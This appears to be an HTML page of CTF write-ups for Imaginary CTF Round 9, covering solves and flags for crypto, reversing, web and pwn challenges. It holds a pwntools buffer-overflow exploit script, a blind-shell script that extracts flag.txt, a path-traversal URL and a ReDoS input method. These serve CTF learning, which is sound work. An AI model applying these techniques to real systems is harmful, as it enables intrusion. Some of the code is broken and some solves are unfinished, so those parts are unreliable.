@@ -1,0 +1,1207 @@
+<!DOCTYPE HTML>
+<html>
+  <head>
+    <link rel="icon" href="https://i.imgur.com/wQxv5zm.png" type="image/gif" sizes="16x16">
+    <title>Max49 iCTF Round 9 Writeups</title>
+    <meta content="Imaginary CTF Writeups" property="og:site_name">
+    <meta content="Max49 Imaginary CTF Round 9 Writeups" property="og:title">
+    <meta content="Writeups for Round 9 of Imaginary CTF!" property="og:description">
+    <meta content="https://www.max49.cf/round-9-writeups.html" property="og:url">
+    <meta content="https://i.imgur.com/wQxv5zm.png" property="og:image">
+    <meta content="#000000" data-react-helmet="true" name="theme-color">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6"
+    crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width">
+    <link href="/static/writeups.css" rel="stylesheet" type="text/css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.7.2/build/styles/an-old-hope.min.css">
+  </head>
+  <body>
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10.7.2/build/highlight.min.js"></script>
+    <script>hljs.highlightAll();</script>
+    <div class="jumbotron text-center">
+      <img class="pfp" src="https://i.imgur.com/wQxv5zm.png" height="150px" width="auto" />
+      <h1>Max49's ICTF Round 9 Challenge Writeups</h1>
+      <p>Color Key (according to the creators, not to me): Green = Easy, Yellow = Easy/Medium, Orange = Medium, Red = Medium/Hard, Purple = Hard, Blue = Really hard</p>
+    </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy chall">
+            <h3>Sanity Check</h3>
+            <p>Welcome to Round 9! Download the file to get the flag. You can submit flags with the <span class="pre" >.flag ictf{s0me_l33t_str1ng}</span> command. DM your flags to me, ImaginaryCTF, NOT to the old CTF Challenge Bot. H​​​​‎​​​​‏‍​​​​​‏​​​​​​‌‏‌ave fun in Round 9!</p>
+            <h5>Attachments</h5>
+            <a href="https://imaginary.ml/r/547B44EC" target="_blank">https://imaginary.ml/r/547B44EC</a><br /><br />
+            <h5>Category</h5>
+            <p>Misc</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p>Board</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p>15</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>So to solve this chall (which was a little harder since it was April Fool's Day), you first needed to download the file you're given and open it to see a youtube link. After getting RickRolled, you would see that the description contains a lot of whitespace. By either scrolling down a lot or "Ctrl + F"ing "ictf{", you would get the flag. The flag was later added to #faq like it always is.</p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{w3lcome_to_r0und_9!}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy chall">
+          <h3>Rotations</h3>
+          <p>Caesar would be proud.</p>
+          <h5>Attachments</h5>
+          <p><span class="pre">:4E7L=bED0DEcCE0_FE06K0H`E90D_>60C_EcfPN</span></p>
+          <h5>Category</h5>
+          <p>Crypto</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p>Eth007</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p>30</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>Solving this chall was pretty simple based on the information you're given. You're given a string with the hint of "Rotations" and "Caesar". From this information, you can tell that this is an ROT47 cipher because ROT13 doesn't affect special characters. By putting this string into <a href="https://gchq.github.io/CyberChef" target="_blank">CyberChef</a> and putting the ROT47 cipher into the middle, we get the flag.</p>
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{l3ts_st4rt_0ut_ez_w1th_s0me_r0t47!}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy-medium chall">
+            <h3>Salty</h3>
+            <p>I like my hashes salty. Like, REALLY salty.</p>
+            <h5>Attachments</h5>
+            <a href="https://imaginary.ml/r/FB146915" target="_blank">https://imaginary.ml/r/FB146915</a><br /><br />
+            <h5>Category</h5>
+            <p>Reversing</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >Eth007</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >70</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>Just based on the hints given in the chall, we can assume that this challenge will probably have something to do with salted hashes. By opening the python script, we see that if this were to be run, we would just be put into a "emulator" of our own system. The checkinput() function is where all the important information is in. By the first line of this function, we know that it's checking to see if the parameter is equal to a value, but we don't know what this value is by just looking at it. Since this is python, we can just open the python terminal and put the right side of this if statement into the terminal to get what we want.<br /><br /><img src="https://i.imgur.com/U7pwlIP.png" alt="output" width="100%" height="auto"/><br /><br />This looks like a hash and we can easily tell what kind of hash it is based on the python script, and it's a SHA512 hash. The first thing I think of when seeing a hash is to put it into <a href="https://crackstation.net/" target="_blank">CrackStation</a>. Putting this hash through returns "saltwater" and knowing that the hashed string was salt + inp, we know that inp is water. Moving on, we see another long encoded string similar to what we saw when we calculated the final hash. Putting this into python gives us a <a href="https://pastebin.com/vU76aJvC" target="_blank">pastebin</a> link. Going here prompts for a password and from the script, we know that the password is inp, which is "water". Putting "water" into this password box gives us the flag. </p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{s4lty_w4ter_1nd33d_4f285a3}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy-medium chall">
+            <h3>ret2win</h3>
+            <p>Here comes your monthly dose of one easy pwn. Can you reach the <span class="pre">win()</span> function?</p>
+            <h5>Attachments</h5>
+            <a href="https://imaginary.ml/r/C2B3-ret2win" target="_blank">https://imaginary.ml/r/C2B3-ret2win</a><br />
+            <p><span class="pre">nc stephencurry.ctfchallenge.ga 5000</span></p>
+            <h5>Category</h5>
+            <p>pwn</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >ainz</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p>75</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <div class="code">
+              <pre>
+                <code class="python">
+from pwn import *
+
+p = remote('stephencurry.ctfchallenge.ga',5000)
+
+offset = b'A' * 12
+payload = offset + p64(0x1337c0d3)
+
+p.sendline(payload)
+
+payload = b'A' * 36 + p64(0x4011b6)
+p.sendline(payload)
+
+p.interactive()  
+                </code>
+              </pre>
+            </div>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{mak1ng_r@nd0m_flags_15_n0t_fun}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy chall">
+            <h3>Camouflage</h3>
+            <p>I can't see anything... maybe I need to get glasses. Please put "ictf" before the string you find.</p>
+            <h5>Attachments</h5>
+            <a href="https://imaginary.ml/r/BCBE6E1A" target="_blank">https://imaginary.ml/r/BCBE6E1A</a><br /><br />
+            <h5>Category</h5>
+            <p>Forensics</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >Artemis37</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >50</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>To solve this challenge, we download the image to see nothing. It just seems to be a black image with nothing in it. From what I know from past CTF competitions, <a href="https://gchq.github.io/CyberChef" target="_blank">CyberChef</a> has a feature called "Randomize Colour Palette" which could help reveal hidden images and text in pictures. Putting this image into CyberChef and dragging in the "Randomize Colour Palette" block into the middle gives us an image with the flag written it in.<br /><br /><img src="https://i.imgur.com/9nyDXF7.png" alt="output" width="100%" height="auto"/><br /><br /></p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{y0U_mu5T_h@v3_4MAz!n9_I_s16h7}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy-medium chall">
+            <h3>sources-adventure-hardened</h3>
+            <p>The boss isn't happy that you all were able to retrieve his flag last time. Now, with the new features he's implemented, he's sure no one will ever get his flag now (NOTE: this challenge does not require the use of enumeration tools or injections)</p>
+            <h5>Attachments</h5>
+            <a href="https://sources-adventure-hardened.max49.repl.co/" target="_blank">https://sources-adventure-hardened.max49.repl.co/</a><br /><br />
+            <h5>Category</h5>
+            <p>Web</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >Max49</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >100</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Intended Solve:</h3>
+            <p>This was one of my challs! So the intended solve for this challenge was as follows:</p>
+            <p>So, on going to the link provided, you're presented a login screen with no info specifically stated. In the original sources-adventure in Round 8, the logins were stored in /logins.txt and that was figured out through inspecting the comments. When viewing the source of the page with Ctrl + U or equivalent, no comments are seen, but the source seems to go on for a while. By searching for the comment marker (&#60;!--) with Ctrl+F or scrolling down, you'll see a conversation where it's mentioned that the file where the logins are stored can't be accessed by search engine crawlers anymore (alternatively, this conversation could've been found much easier in the developer tools). Anyone who has some experience in web ctf challs knows that this is referring to the robots.txt file and on going to this page, it's seen that the page /classified_info is disallowed. Going to this page gives us our login information (All of these do the exact same thing).</p>
+            <p>Now that we have access to the returning employee portal, we're greeted with javascript alert spam like last time. Attempting to deobfuscate this code as was the method of solving the last sources-adventure will be of no use. In the boss notification, it's stated that you will be replaced by rooYay2 with a link to his resume. Going here will show rooYay2's resume and the comments on this webpage say that his employee password will be his favorite emoji, which is rooNoBooli, as seen by hovering over his picture. </p>
+            <p>Logging into rooYay2:rooNoBooli brings up rooYay2's custom portal, with no real info that would point you anywhere specific. The comments just say that it's time for the sources adventure. A comment also stated on rooYay2's resume is to create a custom employee portal based around rooYay2's interests and it did say that cookies were his favorite snack. Inspecting the cookies with developer tools shows two cookies: adminID and adminPass. The values of these two cookies look like hex, but decoding these as hex returns nothing of use. Since it's not hex, the next thought is that it's a hash, as that's what it looks like. Putting these strings into <a href="https://crackstation.net/" target="_blank">CrackStation</a> cracks the hashes and gives us the login panel:"991560128"licypz</p>
+            <p>Logging into the admin panel now gives us a new boss announcement stating that payroll information is located on the payroll page as usual. Going to /payroll gives us a download link to a json file with payroll information stored inside it. An employee ID is also stored with each employee and since the last employee's ID is "ictf", we can assume this is where the flag is, which is in the order from last user ID to first user ID. After putting all these ID's together, we get the flag.</p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{d3v3l0p3r_t00ls_ar3_gr3at!_6c6f6c}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy chall">
+            <h3>pyrev</h3>
+            <p>I think it's time for a <span class="pre">dis.dis()</span> track...</p>
+            <h5>Attachments</h5>
+            <a href="https://imaginary.ml/r/7F0C-out.txt" target="_blank">https://imaginary.ml/r/7F0C-out.txt</a><br /><br />
+            <h5>Category</h5>
+            <p>rev</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >Robin_Jadoul</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >50</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>For this chall, we're given a file that contains what we know to be python bytecode. Given the description, we can look up <span class="pre">dis python</span> to get the <a href="https://docs.python.org/3/library/dis.html">documentation</a> that matches the text we see in the file. Using this documentation, we can rewrite this bytecode in python to get the script that will give us our flag. Rewriting the code using the documentation gives us the code:</p>
+            <div class="pre code">
+              <p>for x in ((0, 6, -17, 14, -21, 25, -23, 5, 15, 2, -12, 11, -1, 6, -4, -12, -6, 9, 8, 5, -3, -3, 6, -6, 4, -18, -6, 26, -2, -18, 20, -17, -9, -4)):<br />&emsp;&emsp;n -= x<br />&emsp;&emsp;print(chr(n), end='')<br />print()<br />return None</p>
+            </div><br />
+            Looking at this code, it's not clear what <span class="pre">n</span> is. Looking at what Robin later posted, we see that this is a parameter being passed in this function.</p>
+            <img src="https://i.imgur.com/q5zPsDa.png" alt="" width="100%" height="auto" />
+            <p>By rearranging our code a little bit to match this scenario, we still need a value to pass into the function that gives us the flag. The flag can be retrieved in one of two ways now. The first way is to ignore logic and just bruteforce numbers 1-300 until you get the flag. Alternatively, some logic can be applied and knowing that the first character has to be <span class="pre">i</span> (flag format is <span class="pre">ictf{</span>), you could find the number that when subtracted by 0 gives you 105, which is <span class="pre">105</span>. Passing 105 into the function gives us our flag.
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{bytecode_could_be_easy_as_py}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy-medium chall">
+            <h3>ImaginaryBot v2</h3>
+            <p>@ImaginaryBot is ok, but @Imaginary Bot(v2) is even better (this is neither an OSINT chall nor an exploitation chall, everything you need to solve the chall can be gotten through commands :wink: )</p>
+            <h5>Attachments</h5>
+            <p>DM @Imaginary Bot (v2) (Do not use the bot in this server)</p>
+            <h5>Category</h5>
+            <p>Misc</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >Max49</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >75</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Intended Solve:</h3>
+            <p>This was another one chall that I submitted this round. This one was a <i>little</i> more guessy than sources-adventure-hardended, but I thought it was pretty straightforward overall (and it's misc, of course it's gonna be guessy to some degree). So when you DM this bot with !help, you're given a list of all the commands the bot has. The first logical step after this is to do !info to learn a little more about what you're supposed to do and rsa is the only kind of info you're given. Doing !rsa gives you an rsa problem to solve where Public Key = (p)(q), e = e, and (c+6)/2 is the ciphertext plus 6 divided by 2. After multiplying the ciphertext by 2 and subtracting 6 to get the real ciphertext, this all can just go into <a href="https://github.com/Ganapati/RsaCtfTool" target="_blank">RsaCtfTool</a> to get the message, which is that this chall might be a steg (steganography) chall. Now that we've gotten !help, !info, and !rsa out of the way, we try the rest of the commands to see that !printflag returns the same output every time it's run and !checkflag literally only checks the flag, which you provide as input, so the only two commands left are !pfp and !imaginary.</p>
+            <p>!pfp functions as a normal pfp command (the original plan for this chall was to embed the flag in the bot's pfp but discord changes the image when you upload it) and poses the only part, I think, in this challenge where someone might get confused. !imaginary is the last command and returns a random output each time, with one of these being an image. With the hint of this being a steg chall, download this image and run some steg tools on it. The intended tool to use was stegseek as this file was hidden with steghide with a passphrase that's in rockyou. The flag was in the embedded txt file.
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{d1sc0rd_b0ts_ar3_s0_c00l_r1ght?}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy-medium chall">
+            <h3>ReDOS</h3>
+            <p>I've made a Super Secure Server(tm) with no vulnerabilities whatsoever. Can you DOS my server to prove me wrong?</p>
+            <p>Note: do <b>NOT</b> DDOS the server.</p>
+            <h5>Attachments</h5>
+            <p><span class="pre">nc oreos.ctfchallenge.ga 1337</span>, <a href="https://imaginary.ml/r/5FC3-redos.py" target="_blank">https://imaginary.ml/r/5FC3-redos.py</a></p>
+            <h5>Category</h5>
+            <p>Reversing/Misc</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >puzzler7</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >75</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>So in this chall, we're given a nc server to connect to and some source code. Firstly, based off the title, by looking up "ReDOS", we see that this is a DOS attack where the regex takes too long to compute. By analyzing the source code a little bit, we see that we need to get the code to timeout in order to give us the flag. To get the code to return <span class="pre">TimeoutError</span>, we see that we need to get <span class="pre">validateEmail(email)</span> to timeout for 10 seconds, and this function just checks input against a regex. We also see that <span class="pre">validateEmail(email)</span> is only called in the <span class="pre">createAcc()</span> function and this function is only called when we access the "Create Account" input from the menu we're greeted with.</p>
+            <p>So basically, to sum it up, we need to make the email input time out when we create an account</p>
+            <p>By entering the regex into <a href="https://regex101.com/" target="_blank">regex101</a>, we can analyze the regex to see what it's looking for. To simplify it, the regex is looking for:</p>
+            <div class="pre">
+              <p>(anything an unlimited number of times)@gmail(unlimited number of times).(com|org|edu|gg) (where | is or)</p>
+            </div><br />
+            <p>So examples of string that match this regex include:</p>
+            <div class="pre">
+              <p>admin@gmail.com<br />aaaaaaaaaaaaaaaaaaaaaaaaaa@gmail.gg<br /> grhpwopoh@gmailgmail.org<br /> opwuerpoweurpwoe@gmailgmailgmail.edu</p>
+            </div><br />
+            <p>When entering test strings into regex101, we can see how long it takes for the regex to compute:</p>
+            <img src="https://i.imgur.com/rGHQnXQ.png" alt="" width="100%" height="auto" /><br /><br />
+            <p>and since we know that this is a ReDOS attack and we need to timeout the regex, we should be looking at this number during our testing.</p>
+            <p>From here, there are two ways of finding an email that times out the regex. The first way (the way I originally solved it) was just spamming gmail a bunch of times until the time turned into "catastrophic backtracking"</p>
+            <img src="https://i.imgur.com/qm5pwfm.png" alt="" width="100%" height="auto" /><br /><br />
+            <p>An alternative (and much better) way of getting a string was seeing that after typing a certain amount of "gmail"s, typing any other character would also return "catastrophic backtracking"</p>
+            <img src="https://i.imgur.com/f77KIWW.png" alt="" width="100%" height="auto" /><br /><br />
+            <p>Inputting any of these strings that return "catastrophic backtracking" when the program prompts the creation of an account will cause the program to timeout and will display the flag.</p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{3v3n_r3g3x_i5_in53cur3}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy-medium chall">
+            <h3>Optimal RSA</h3>
+            <p>You're aware that textbook RSA is actually insecure, right? So anyway, I applied some padding. For even more security, I'm also using SHA512.</p>
+            <h5>Attachments</h5>
+            <a href="https://imaginary.ml/r/96A4-output.txt" target="_blank">https://imaginary.ml/r/96A4-output.txt</a><br /><br />
+            <h5>Category</h5>
+            <p>Crypto</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >Robin_Jadoul</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >75</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>My solve script:</p>
+            <div class="code">
+              <pre>
+                <code class="python">
+                  <p>from Crypto.Cipher import PKCS1_OAEP
+from Crypto.PublicKey import RSA
+from Crypto.Hash import SHA512
+
+class RSA:
+  n = [long number redacted]
+  e = 65537
+  d = [long number redacted]
+  def _decrypt(self, ciphertext):
+    return pow(ciphertext, self.d, self.n) 
+
+ciphertext = bytes.fromhex("[long string redacted]")
+key = RSA()
+cipher = PKCS1_OAEP.new(key, hashAlgo=SHA512)
+message = cipher.decrypt(ciphertext) 
+print(message)</p>
+                </code>
+              </pre>
+            </div>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{single_primes_are_definitely_optimal}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="medium chall">
+            <h3>Blind Shell</h3>
+            <p>Normally once you have a shell, you win. Here, you already start with a shell - can you find your way to the flag?</p>
+            <h5>Attachments</h5>
+            <p><a href="https://imaginary.ml/r/CABD-blind.py" target="_blank">https://imaginary.ml/r/CABD-blind.py</a>, <span class="pre">nc oreos.ctfchallenge.ga 12345</span></p>
+            <h5>Category</h5>
+            <p>Misc/Pwn</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >puzzler7</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >125</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <div class="code">
+              <pre>
+                <code class="python">
+                  <p>from pwn import *  
+import string
+
+p = remote('oreos.ctfchallenge.ga',12345) 
+chars = list(string.printable)
+command = "grep -F "
+flag = "ictf{"
+chars.remove('\n')
+while True:
+for char in chars:
+    p.recvuntil(b'>>> ')
+    p.sendline(command + "\'" + flag + char + "\' flag.txt" )
+    if(p.recvline() == b'SUCCESS\n'):
+      flag += char
+      if(char == "}"):
+        print(flag)
+        break
+      else:
+        continue
+  if(flag[-1] == "}"):
+    break</p>
+                </code>
+              </pre>
+            </div>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{g01n8_1n_bl!nd?n0t_@_pr0bl3m!}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy chall">
+            <h3>Look-For-It</h3>
+            <p>Look for <span class="pre">flag.txt</span></p>
+            <p><b>Note:</b> This is a very easy 30 point challenge and does not require the use of enumeration tools.</p>
+            <h5>Attachments</h5>
+            <p><a href="http://lookforit.epizy.com/" target="_blank">http://lookforit.epizy.com/</a></p>
+            <h5>Category</h5>
+            <p>Web</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >ainz</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >30</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>This chall was a nice and easy one. We know the flag is in flag.txt and Eth007 gave the hint that it's very similar to "Pathological Liars", a challenge from the previous round. The solve for that chall was to go to the directory ../flag.txt, and doing something similar on this link gives us the flag. (The solve link is <a href="http://lookforit.epizy.com/?page=../flag.txt" target="_blank">http://lookforit.epizy.com/?page=../flag.txt</a>)</p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{l00ked_f0rit&_found_w@ld0..._n0t_really}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+    <div class="flex-container">
+      <div class="flex-child">
+        <div class="easy-medium chall">
+          <h3>Rotations of a different kind</h3>
+          <p>We've had one rotation, yes, but what about another one?</p>
+          <h5>Attachments</h5>
+          <p><span class="pre">69c6d133b72d9bb172cab52be68e5a3767beb12b668ed7396fe885a396ed9bb97d</span></p>
+          <h5>Category</h5>
+          <p>crypto/misc</p>
+          <div class="inline-container">
+            <div class="inline-child">
+              <h5>Author</h5>
+              <p >Robin_Jadoul</p>
+            </div> 
+            <div class="inline-child">
+              <h5>Points</h5>
+              <p >75</p>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="flex-child">
+        <div class="solve">
+          <h3>Solve:</h3>
+          <p>So for this chall, we're just given a string from which we have to find the flag. The only hint we're given is that this challenge is solved with rotations. We can put this string into <a href="https://gchq.github.io/CyberChef" target="_blank">CyberChef</a> and see what we can do. Since this string isn't the right length to be any kind of common hash, let's just hex decode it to see what we can do. Hex decoding this gives us something that doesn't look exactly right, but it does start with an i, so we can attempt to work with this for now.</p>
+          <p>With the hint of rotations, we can try ROT13 or ROT47, but neither of those will give us the flag.
+        </div>
+        <div class="flag">
+          <h5>Flag:&nbsp;&nbsp;</h5><br />
+          <p>ictf{incrementing_left_rotations}</p>
+        </div>
+      </div>
+    </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="medium chall">
+            <h3>Spacebar Smasher</h3>
+            <p>I hid my flag super deep in this game. Press the spacebar to advance. You'll have to play for days. I challenge you to get the flag! <i>Note this is NOT a reversing challenge</i></p>
+            <h5>Attachments</h5>
+            <p><a href="https://spacebarsmasher.netlify.app/" target="_blank">https://spacebarsmasher.netlify.app/</a></p>
+            <h5>Category</h5>
+            <p>Misc/Web</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >Astro</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >150</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve"> 
+            <h3>Solve:</h3>
+            <p>coming soon, I forgot to make a writeup for this one give me a little bit.</p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{y0ur_r34l_l1f3_sp4ceb4r_mu$t_b3_br0ken..._w@1t_wdym_y0u_d1dnt_cl1ck_214748366_times?!}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="easy-medium chall">
+            <h3>lookup-rev</h3>
+            <p>This program is too slow, what do I do?</p>
+            <h5>Attachments</h5>
+            <p><a href="https://imaginary.ml/r/E0FA-wpre.py" target="_blank">https://imaginary.ml/r/E0FA-wpre.py</a></p>
+            <h5>Category</h5>
+            <p>Reversing</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >ainz</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >75</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>This was a cool python reversing challenge. So when running this program as it was originally made, the only output printed is "ictf" until the program hangs. In analyzing what's taking place when this program is run, it can be seen that the part that makes the program hang is that part that checks if the number is prime. If we edit the program to print the numbers being tested before they enter the function, we see that the program hangs because the numbers get too large. We know that pycryptodome, more specifically Crypto.Util.number, has a function that checks if a number is prime and provides a True/False output like the current code does, so if we replace</p>
+            <div class="code">
+              <p>&emsp;return all(n % i for i in islice(count(2), int(sqrt(n)-1)))</p>
+            </div>
+            <p>with</p>
+            <div class="code">
+              <p>&emsp;return isPrime(n)</p>
+            </div>
+            <p>and run the program now, we see that we immediately get many more characters in the flag, but after a certain point, the program hangs again. In this case though, we know the program is working because it's slowly printing the output (this will get much slower over time)</p>
+            <p>Now we can see "ictf{l00kup_w00dal" after waiting about five minutes. Knowing that we're working with prime numbers, we lookup "woodall primes" and are given a <a href="https://en.wikipedia.org/wiki/Woodall_number" target="_blank">Wikipedia article</a> about them. From the beginning of the article, we see that a Woodall number is caculated by the equation <i>W = (n • 2**n) - 1</i>, which is exactly what's happening in the sequence() function. Now that we know that a character will only print when n returns a Woodall prime, we can go to <a href="https://mathworld.wolfram.com/WoodallPrime.html" target="_blank">this website</a> to see some values of n that would give us a Woodall prime number. Adding the list:</p>
+            <div class="code">
+              <p>&emsp;woodall_nums = [2, 3, 6, 30, 75, 81, 115, 123, 249, 362, 384, 462, 512, 751, 822, 5312, 7755, ...]</p>
+            </div>
+            <p>at the beginning of the code and changing the end of the code to:</p>
+            <div class="code">
+              <p>&emsp;i = woodall_nums[0]<br />
+              &emsp;for i in range(len(woodall_nums)):<br />
+              &emsp;&emsp; i = woodall_nums[i]<br />
+              &emsp;&emsp; print(chr(key[0]^i%100))<br />
+              &emsp;&emsp; key.pop(0)<br />
+              &emsp;&emsp; i += 1</p>
+            </div>
+            <p>and then running the program again will print out our flag instantly</p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>ictf{l00kup_w00dall_pr1me5_78e7f}</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="medium chall">
+            <h3>The GOAT</h3>
+            <p>Buffer overflows are overrated. Try to pwn the GOAT's server instead. Connect with <span class="pre">nc stephencurry.ctfchallenge.ga 5001</span>.</p>
+            <h5>Attachments</h5>
+            <p><a href="https://imaginary.ml/r/E7BF-goat" target="_blank">https://imaginary.ml/r/E7BF-goat</a></p>
+            <h5>Category</h5>
+            <p>Pwn</p>
+            <div class="inline-container">
+              <div class="inline-child">
+                <h5>Author</h5>
+                <p >Eth007</p>
+              </div> 
+              <div class="inline-child">
+                <h5>Points</h5>
+                <p >150</p>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="flex-child">
+          <div class="solve">
+            <h3>Solve:</h3>
+            <p>Unsolved &nbsp;<img src="https://cdn.discordapp.com/emojis/778310888243200021.png?v=1" alt="" width="45px" height="auto" /></p>
+          </div>
+          <div class="flag">
+            <h5>Flag:&nbsp;&nbsp;</h5><br />
+            <p>not found</p>
+          </div>
+        </div>
+      </div>
+    <hr />
+      <div class="flex-container">
+        <div class="flex-child">
+          <div class="medium chall">
+            <h3>What's a database</h3>
+            <p>What's a database? Why don't you store actual information? Why do I need to guess?</p>
+            <h5>Attachments</h5>
